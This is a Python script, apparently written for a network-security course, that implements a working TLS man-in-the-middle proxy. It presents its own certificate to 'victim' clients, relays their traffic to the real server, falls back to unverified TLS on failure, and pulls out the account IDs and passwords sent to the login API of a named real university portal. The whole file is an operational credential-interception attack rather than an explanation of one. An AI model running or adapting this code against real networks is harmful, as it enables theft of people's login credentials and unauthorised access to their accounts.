#!/usr/bin/env python3
# Copyright (C) 2024 Chung-Yi Chen
import dataclasses
import fcntl
import os
import socket
import ssl
import struct
import sys
import threading


# https://stackoverflow.com/a/24196955
def get_ip_by_ifname(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(
        fcntl.ioctl(
            sock.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', ifname[:15])
        )[20:24]
    )


@dataclasses.dataclass
class ServerConfig:
    bind_ip: str
    bind_port: int
    certfile: str
    keyfile: str
    timeout: float = 30


class Server:
    def __init__(self, config):
        for name, value in dataclasses.asdict(config).items():
            setattr(self, name, value)

    def split_message(self, message):
        '''https://datatracker.ietf.org/doc/html/rfc9112#name-message-format
        HTTP-message = start-line
                       *( field-line CRLF )
                       CRLF
                       [ message-body ]
        '''
        # split the start line
        index = message.index(b'\r\n')
        start_line, message = message[:index+2], message[index+2:]

        # split the header and (a part of) the body
        index = message.index(b'\r\n\r\n')
        header = message[:index+2]  # ignore the separating CRLF
        body = message[index+4:]

        return (start_line, header, body)

    def get_field_value(self, header, field_name, value=b''):
        '''https://datatracker.ietf.org/doc/html/rfc9112#name-field-syntax
        header-field = field-name ":" OWS field-value OWS
        '''
        for line in header.split(b'\r\n'):
            if field_name in line:
                return line.split(b':')[1].strip()

        return value

    def receive_until(self, sock, cond, data=b'', bufsize=4096):
        while not cond(data):
            # implement the HTTP keep alive timeout mechanism
            sock.settimeout(self.timeout)

            if block := sock.recv(bufsize):
                data += block
            else:  # the peer has closed the connection
                raise socket.timeout

        return data

    def receive_http_message(self, sock):
        # read the partial message that contains the header
        message = self.receive_until(sock, lambda x: b'\r\n\r\n' in x)

        (start_line, header, body) = self.split_message(message)

        # parse Content-Length and then read the remaining body
        length = self.get_field_value(header, b'Content-Length')
        length = int(length) if length else 0
        body = self.receive_until(sock, lambda x: len(x) >= length, body)

        # handle the chunked encoding if necessary
        if b'chunked' in self.get_field_value(header, b'Transfer-Encoding'):
            body = self.receive_until(sock, lambda x: b'\r\n\r\n' in x, body)

        return (start_line, header, body)

    def search_password(self, start_line, header, body):
        if start_line != b'POST /portal/api/PortalLdapLogin HTTP/1.1\r\n':
            return

        if self.get_field_value(header, b'Host') != b'portal.nycu.edu.tw':
            return

        for line in body.split(b'&'):
            if b'id=' in line:
                account = line[3:].decode()
            elif b'pwd=' in line:
                password = line[4:].decode()

        out_str = f'[portal.nycu.edu.tw] id = {account}, pwd = {password}'
        print(f'\033[33m{out_str}\033[0m')

    def raise_timeout_if_connection_closed(self, header):
        if b'close' in self.get_field_value(header, b'Connection'):
            raise socket.timeout

    def handle(self, victim_sock, victim_addr):
        victim_str = f'{victim_addr[0]}:{victim_addr[1]}'

        # handle the initial request
        try:
            # create the TLS server context, only accept http/1.1
            ctx_victim = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx_victim.load_cert_chain(self.certfile, self.keyfile)
            ctx_victim.set_alpn_protocols(['http/1.1'])

            victim_sock = ctx_victim.wrap_socket(
                victim_sock,
                server_side=True
            )

            # receive the victim's request
            start_line, header, body = self.receive_http_message(victim_sock)
        except ssl.SSLError:
            print(f'[{victim_str}] TLS handshake failed')
            victim_sock.close()
            return
        except (socket.error, socket.timeout):
            print(f'[{victim_str}] Connection failed')
            victim_sock.close()
            return

        # https://stackoverflow.com/a/30574072
        addr_in = victim_sock.getsockopt(socket.SOL_IP, 80, 16)
        (_, server_port, a, b, c, d) = struct.unpack('!HHBBBB', addr_in[:8])

        server_ip = f'{a}.{b}.{c}.{d}'
        server_name = self.get_field_value(header, b'Host').decode()
        server_str = f'{server_ip}:{server_port}|{server_name}'

        # establish the MITM-server connection
        try:
            # create the TLS client context, only accept http/1.1
            ctx_server = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx_server.set_alpn_protocols(['http/1.1'])
            ctx_server.load_default_certs()

            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock = ctx_server.wrap_socket(
                server_sock,
                server_hostname=server_name
            )

            server_sock.connect((server_ip, server_port))
        except ssl.SSLError:
            print(f'[{server_str}] TLS handshake failed')
            server_sock.close()

            # downgrade to unverified TLS, it's fine as this is an attack
            try:
                ctx_server.check_hostname = False
                ctx_server.verify_mode = ssl.CERT_NONE

                server_sock = socket.socket(
                    socket.AF_INET,
                    socket.SOCK_STREAM
                )

                server_sock = ctx_server.wrap_socket(
                    server_sock,
                    server_hostname=server_name
                )

                server_sock.connect((server_ip, server_port))
            except ssl.SSLError:
                print(f'[{server_str}] Connection failed')
                victim_sock.close()
                server_sock.close()
                return
        except (socket.error, socket.timeout):
            print(f'[{server_str}] Connection failed')
            victim_sock.close()
            server_sock.close()
            return

        to_str = f'{victim_str} > {server_str}'
        from_str = f'{victim_str} < {server_str}'
        end_str = f'{victim_str} X {server_str}'

        print(f'[{to_str}] {start_line[:-2].decode()}')

        # search ID and password
        self.search_password(start_line, header, body)

        try:
            while True:
                # send the victim's request to the server
                server_sock.sendall(
                    start_line + header + b'\r\n' + body
                )

                # check if the victim closed the connection
                self.raise_timeout_if_connection_closed(header)

                # receive the server's response
                start_line, header, body = \
                    self.receive_http_message(server_sock)

                print(f'[{from_str}] {start_line.decode()[:-2]}')

                # send the server's response to the victim
                victim_sock.sendall(
                    start_line + header + b'\r\n' + body
                )

                # check if the server closed the connection
                self.raise_timeout_if_connection_closed(header)

                # receive the victim's request
                start_line, header, body = \
                    self.receive_http_message(victim_sock)

                print(f'[{to_str}] {start_line.decode()[:-2]}')

                # search ID and password
                self.search_password(start_line, header, body)
        except (socket.error, socket.timeout):
            pass

        print(f'[{end_str}] Connection closed')
        victim_sock.close()
        server_sock.close()

    def run(self):
        # set up the binding socket
        bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bind_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bind_sock.bind((self.bind_ip, self.bind_port))
        bind_sock.listen(10)

        bind_str = f'{self.bind_ip}:{self.bind_port}'
        print(f'[{bind_str}] MITM listening')

        while True:
            try:
                victim_sock, victim_addr = bind_sock.accept()
            except socket.error:
                print(f'[{bind_str}] MITM serving failed')
            else:
                threading.Thread(
                    target=self.handle,
                    args=(victim_sock, victim_addr)
                ).start()


if __name__ == '__main__':
    def error_exit(*args, **kwargs):
        print('[Error]', *args, **kwargs, file=sys.stderr)
        sys.exit(1)

    # check root privilege
    if os.getuid() != 0:
        error_exit('Not running with root privilege')

    # check the number of arguments
    if not 1 <= len(sys.argv) <= 2:
        prefix_str = '' if sys.argv[0][:2] == './' else 'python3 '
        exec_str = prefix_str + sys.argv[0]
        usage_str = f'Usage: [ sudo ] {exec_str} [ <interface> ]'
        error_exit(usage_str)

    # check if the interface is valid
    try:
        if len(sys.argv) == 1:
            bind_ip = '0.0.0.0'
        else:
            bind_ip = get_ip_by_ifname((sys.argv[1] + '\0').encode())
    except:
        error_exit('Invalid interface')

    config = ServerConfig(
        bind_ip=bind_ip,
        bind_port=8080,
        certfile='host.crt',
        keyfile='host.key',
    )

    Server(config).run()
